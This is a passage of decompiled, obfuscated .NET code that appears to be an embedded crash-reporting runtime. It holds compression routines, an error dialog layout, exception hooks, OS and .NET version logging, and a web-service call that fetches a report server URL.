			*(int*)((byte*)ptr + 12) += class9_0.class10_0.short_0[*(int*)((byte*)ptr + 16)] * Class7.Class9.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += class9_0.class10_1.short_0[*(int*)((byte*)ptr + 20)] * Class7.Class9.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (int_0 >= 0 && int_1 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class24.smethod_127(int_1, byte_0, bool_0, int_0, class9_0);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class24.smethod_89(class9_0.class12_0, 2 + (bool_0 ? 1 : 0), 3);
			Class7.Class9.Class10 class10_3 = class9_0.class10_0;
			short[] short_ = Class7.Class9.short_1;
			byte[] byte_ = Class7.Class9.byte_2;
			Class24.smethod_131(short_, byte_, class10_3);
			class10_3 = class9_0.class10_1;
			short_ = Class7.Class9.short_2;
			byte_ = Class7.Class9.byte_3;
			Class24.smethod_131(short_, byte_, class10_3);
			Class24.smethod_28(class9_0);
			Class24.smethod_24(class9_0);
		}
		else
		{
			Class24.smethod_89(class9_0.class12_0, 4 + (bool_0 ? 1 : 0), 3);
			Class24.smethod_98(class9_0, *(int*)ptr);
			Class24.smethod_28(class9_0);
			Class24.smethod_24(class9_0);
		}
	}

	unsafe static int smethod_154(Class7.Class11 class11_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = ((class11_0.int_0 << 5) ^ class11_0.byte_0[class11_0.int_4 + 2]) & 0x7FFF;
		short num = (class11_0.short_1[class11_0.int_4 & 0x7FFF] = class11_0.short_0[*(int*)ptr]);
		class11_0.short_0[*(int*)ptr] = (short)class11_0.int_4;
		class11_0.int_0 = *(int*)ptr;
		*(int*)((byte*)ptr + 4) = num & 0xFFFF;
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_155(Class7.Class12 class12_0)
	{
		if (class12_0.int_2 > 0)
		{
			class12_0.byte_0[class12_0.int_1++] = (byte)class12_0.uint_0;
			if (class12_0.int_2 > 8)
			{
				class12_0.byte_0[class12_0.int_1++] = (byte)(class12_0.uint_0 >> 8);
			}
		}
		class12_0.uint_0 = 0u;
		class12_0.int_2 = 0;
	}

	unsafe static void smethod_156(Class7.Class9.Class10 class10_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class10_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class10_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class10_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class10_0.int_1 = Math.Max(num2 + 1, class10_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class10_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class24.smethod_14(class10_0, array2);
	}

	static void smethod_157(string string_0, Class43 class43_0)
	{
		try
		{
			lock (Class43.object_0)
			{
				Class24.smethod_47(class43_0);
				Class24.smethod_79(string_0);
			}
		}
		catch
		{
		}
	}

	unsafe static void smethod_158(Class7.Class9.Class10 class10_0, Class7.Class9.Class10 class10_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class10_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class10_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					class10_0.short_0[*(int*)((byte*)ptr + 16)]++;
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class10_1.int_1 && *(int*)((byte*)ptr + 8) == class10_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				class10_0.short_0[*(int*)((byte*)ptr + 8)] += (short)num;
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				class10_0.short_0[16]++;
			}
			else if (num <= 10)
			{
				class10_0.short_0[17]++;
			}
			else
			{
				class10_0.short_0[18]++;
			}
		}
	}

	static bool smethod_159(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_3;
	}

	static void smethod_160(Class7.Class9.Class10 class10_0, int int_0)
	{
		Class24.smethod_89(class10_0.class9_0.class12_0, class10_0.short_1[int_0] & 0xFFFF, (int)class10_0.byte_0[int_0]);
	}

	static Class25 smethod_161()
	{
		if (Class25.class25_0 == null)
		{
			Type[] types = Assembly.GetExecutingAssembly().GetTypes();
			foreach (Type type in types)
			{
				if ((object)type == null || (object)type.BaseType == null || (object)type.BaseType != typeof(Class25))
				{
					continue;
				}
				try
				{
					Class25.class25_0 = (Class25)Activator.CreateInstance(type, nonPublic: true);
					if (Class25.class25_0 != null)
					{
						break;
					}
				}
				catch
				{
				}
			}
		}
		return Class25.class25_0;
	}

	static void smethod_162(Class32 class32_0, Delegate3 delegate3_0)
	{
		Delegate3 @delegate = class32_0.delegate3_0;
		Delegate3 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate3 value = (Delegate3)Delegate.Combine(delegate2, delegate3_0);
			@delegate = Interlocked.CompareExchange(ref class32_0.delegate3_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static void smethod_163(byte[] byte_0, Class7.Class8 class8_0)
	{
		Class24.smethod_165(byte_0, class8_0.class11_0);
	}

	static bool smethod_164(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_1;
	}

	static void smethod_165(byte[] byte_0, Class7.Class11 class11_0)
	{
		class11_0.byte_1 = byte_0;
		class11_0.int_7 = 0;
		class11_0.int_8 = byte_0.Length;
	}

	static string smethod_166(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.string_0;
	}

	static void smethod_167(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_168(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class24.smethod_120(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_169(Class7.Stream0 stream0_0, int int_0)
	{
		Class24.smethod_112(stream0_0, int_0);
		Class24.smethod_112(stream0_0, int_0 >> 16);
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_170(Class25 class25_0)
	{
		if (class25_0 != null)
		{
			Class25.class25_0 = class25_0;
			AppDomain.CurrentDomain.UnhandledException += class25_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class25_0.method_0);
		}
	}

	static void smethod_171(Class37 class37_0, Delegate4 delegate4_0)
	{
		if (class37_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService1 uploadReportLoginService = new UploadReportLoginService1();
				if (class37_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class37_0.iwebProxy_0);
				}
				class37_0.string_2 = uploadReportLoginService.GetServerURL(class37_0.string_1);
				if (class37_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class37_0.string_2 == "ditto")
				{
					class37_0.string_2 = Class37.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate4_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate4_0(class37_0.string_2.StartsWith("ERR") ? class37_0.string_2 : "OK");
	}

	unsafe static void smethod_172()
	{
		void* ptr = stackalloc byte[12];
		try
		{
			if (Class24.smethod_143("v4"))
			{
				Class39.smethod_0("Platform: .NET 4.0 installed");
			}
			else if (Class24.smethod_143("v3.5"))
			{
				Class39.smethod_0("Platform: .NET 3.5 installed");
			}
			else if (Class24.smethod_143("v3.0"))
			{
				Class39.smethod_0("Platform: .NET 3.0 installed");
			}
			else if (Class24.smethod_143("v2.0.50727"))
			{
				Class39.smethod_0("Platform: .NET 2.0 installed");
			}
			else if (Class24.smethod_143("v1.1.4322"))
			{
				Class39.smethod_0("Platform: .NET 1.1 installed");
			}
			*(int*)ptr = Environment.OSVersion.Version.Major;
			switch (*(int*)ptr)
			{
			case 5:
				*(int*)((byte*)ptr + 4) = Environment.OSVersion.Version.Minor;
				switch (*(int*)((byte*)ptr + 4))
				{
				case 0:
					Class39.smethod_0("Platform: Windows 2000");
					break;
				case 1:
					Class39.smethod_0("Platform: Windows XP");
					break;
				case 2:
					Class39.smethod_0("Platform: Windows 2003");
					break;
				}
				break;
			case 6:
				*(int*)((byte*)ptr + 8) = Environment.OSVersion.Version.Minor;
				switch (*(int*)((byte*)ptr + 8))
				{
				case 0:
					Class39.smethod_0("Platform: Windows Vista/2008");
					break;
				case 1:
					Class39.smethod_0("Platform: Windows 7/2008 R2");
					break;
				case 2:
					Class39.smethod_0("Platform: Windows 8");
					break;
				}
				break;
			}
			Class24.smethod_84();
			Class24.smethod_74();
			Class24.smethod_107();
		}
		catch
		{
		}
	}

	static void smethod_173(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_1).set_Size(new Size(100, 24));
		((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
		((Control)form1_0.button_1).set_TabIndex(0);
		((Control)form1_0.button_1).set_Text("&Quit");
		((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
		((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_0).set_Size(new Size(100, 24));
		((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
		((Control)form1_0.button_0).set_TabIndex(1);
		((Control)form1_0.button_0).set_Text("&Continue");
		((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
		((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
		Class24.smethod_123(Enum1.const_2, form1_0.control1_0);
		((Control)form1_0.class23_0).set_Anchor((AnchorStyles)13);
		((Control)form1_0.class23_0).set_Location(new Point(20, 72));
		((Control)form1_0.class23_0).set_Size(new Size(382, 13));
		((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form1_0).set_ClientSize(new Size(418, 224));
		((Form)form1_0).set_ControlBox(false);
		((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
		{
			form1_0.control2_0,
			(Control)form1_0.button_0,
			(Control)form1_0.button_1,
			form1_0.control1_0,
			(Control)form1_0.class23_0
		});
		((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form1_0).set_MaximizeBox(false);
		((Form)form1_0).set_MinimizeBox(false);
		((Form)form1_0).set_ShowInTaskbar(false);
		((Form)form1_0).set_StartPosition((FormStartPosition)1);
		((Control)form1_0).ResumeLayout(false);
	}

	static void smethod_174(Control0 control0_0)
	{
		Class24.smethod_63(control0_0, string.Empty);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool IsWow64Process(IntPtr intptr_0, out bool bool_0);

	unsafe static int smethod_175(Class7.Class9.Class10 class10_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class10_0.short_0.Length)
		{
			*(int*)ptr += class10_0.short_0[*(int*)((byte*)ptr + 4)] * class10_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	static void smethod_176(Class15 class15_0, Enum0 enum0_0)
	{
		Class24.smethod_13(class15_0, enum0_0, string.Empty);
	}

	static void smethod_177(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class24.smethod_120(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static bool smethod_178(Class40 class40_0)
	{
		if (class40_0.ulong_0.Length == 0)
		{
			return class40_0.dictionary_0.Count == 0;
		}
		return false;
	}

	unsafe static string smethod_179(object object_0)
	{
		void* ptr = stackalloc byte[46];
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int)
			{
				*(int*)((byte*)ptr + 32) = (int)object_0;
				return ((int*)((byte*)ptr + 32))->ToString("x");
			}
			if (object_0 is long)
			{
				*(long*)ptr = (long)object_0;
				return ((long*)ptr)->ToString("x");
			}
			if (object_0 is short)
			{
				*(short*)((byte*)ptr + 40) = (short)object_0;
				return ((short*)((byte*)ptr + 40))->ToString("x");
			}
			if (object_0 is uint)
			{
				*(uint*)((byte*)ptr + 36) = (uint)object_0;
				return ((uint*)((byte*)ptr + 36))->ToString("x");
			}
			if (object_0 is ulong)
			{
				*(ulong*)((byte*)ptr + 8) = (ulong)object_0;
				return ((ulong*)((byte*)ptr + 8))->ToString("x");
			}
			if (object_0 is ushort)
			{
				*(ushort*)((byte*)ptr + 42) = (ushort)object_0;
				return ((ushort*)((byte*)ptr + 42))->ToString("x");
			}
			if (object_0 is byte)
			{
				((byte*)ptr)[44] = (byte)object_0;
				return ((byte*)ptr)[44].ToString("x");
			}
			if (object_0 is sbyte)
			{
				((byte*)ptr)[45] = (byte)(sbyte)object_0;
				return ((sbyte*)((byte*)ptr + 45))->ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				*(long*)((byte*)ptr + 16) = intPtr.ToInt64();
				return ((long*)((byte*)ptr + 16))->ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				*(ulong*)((byte*)ptr + 24) = ((UIntPtr)object_0).ToUInt64();
				return ((ulong*)((byte*)ptr + 24))->ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_180(string string_0)
	{
		try
		{
			Class41.isolatedStorageFile_0.DeleteFile(string_0);
		}
		catch (IsolatedStorageException)
		{
		}
	}

	static void smethod_181()
	{
		using (Class24.smethod_130())
		{
			Class24.smethod_22();
		}
	}

	static void smethod_182(long long_0, string string_0)
	{
		using IsolatedStorageFileStream isolatedStorageFileStream = Class24.smethod_5(FileAccess.ReadWrite, string_0, FileMode.OpenOrCreate);
		isolatedStorageFileStream.Position = long_0 + 8L;
		isolatedStorageFileStream.Position = long_0;
		ulong num = new BinaryReader(isolatedStorageFileStream).ReadUInt64();
		num++;
		isolatedStorageFileStream.Position = long_0;
		new BinaryWriter(isolatedStorageFileStream).Write(num);
	}

	static bool smethod_183()
	{
		return Class24.smethod_36().byte_0 == 1;
	}

	static void smethod_184(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static void smethod_185(Class15 class15_0, IWebProxy iwebProxy_0)
	{
		class15_0.iwebProxy_0 = iwebProxy_0;
	}

	static string smethod_186(Class15.Class19 class19_0)
	{
		return class19_0.string_0;
	}

	static int smethod_187()
	{
		Version version = new Version("6.8.0.117");
		return version.Major;
	}
}
